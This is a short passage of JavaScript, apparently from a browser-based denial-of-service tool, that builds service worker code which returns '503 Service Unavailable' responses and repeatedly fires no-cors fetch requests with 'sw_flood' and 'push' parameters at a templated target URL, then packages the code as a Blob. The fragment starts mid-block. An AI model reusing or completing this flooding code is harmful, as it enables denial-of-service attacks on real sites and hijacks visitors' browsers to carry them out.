                        event.respondWith(new Response('Service Unavailable', {status: 503}));

                        fetch('${target}/?sw_flood=' + Math.random(), {mode: 'no-cors'});

                        fetch('${target}/?push=' + i);
                    }

            const blob = new Blob([swCode], {type: 'application/javascript'});
